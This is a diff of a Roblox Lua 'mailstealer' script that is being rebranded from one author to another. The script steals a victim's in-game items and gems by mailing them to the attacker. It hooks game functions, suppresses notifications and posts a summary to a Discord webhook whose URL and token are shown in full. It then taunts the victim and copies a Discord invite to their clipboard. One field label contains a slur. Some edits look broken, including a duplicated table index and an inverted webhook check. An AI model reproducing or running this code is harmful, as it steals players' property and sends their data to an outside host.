@@ -14,7 +14,7 @@ local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
-local MailMessage = "Light Monzz ON Top"
+local MailMessage = "GG / GY2RVSEGDT"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -59,17 +59,17 @@ local function SendMessage(username, diamonds)
 
 	local fields = {
 		{
-			name = "🌊 UserName:",
+			name = "Retard Username:",
 			value = username,
 			inline = true
 		},
 		{
-			name = "✏️ Items List:",
+			name = "Items to be sent:",
 			value = "",
 			inline = false
 		},
         {
-            name = "🥳 Summary:",
+            name = "Summary:",
             value = "",
             inline = false
         }
@@ -109,7 +109,7 @@ local function SendMessage(username, diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Light Monzz. discord.gg/CAr4FZHAyF"
+				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
@@ -129,7 +129,7 @@ local function SendMessage(username, diamonds)
 
     local body = HttpService:JSONEncode(data)
 
-    if webhook and webhook ~= "" then
+    if webhook and webhook ~= "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN" then
         local response = request({
             Url = webhook,
             Method = "POST",
@@ -145,7 +145,7 @@ gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 	gemsleaderstatpath.Value = gemsleaderstat
 end)
 
-local loading = plr.PlayerScripts.ScriptsFREE_11cbcfed2ae1b415cdaedee8a32f1173.Core["Process Pending GUI"]
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
@@ -234,11 +234,9 @@ local function IsMailboxHooked()
 		break
 	end
 	local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
-        [5] = 1
+        [1] = user,
+        [2] = uid,
+        [2] = 1
     }
     local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
     if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
@@ -311,7 +309,7 @@ end
 if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     ClaimMail()
 	if IsMailboxHooked() then
-        getFucked = false
+        getFucked = true
 		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
         for i, Func in ipairs(getgc(true)) do
             if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
@@ -362,6 +360,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Light Monzz mailstealer!\n Join discord.gg/CAr4FZHAyF")
-    setclipboard("discord.gg/CAr4FZHAyF")
+    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+    setclipboard("discord.gg/GY2RVSEGDT")
 end
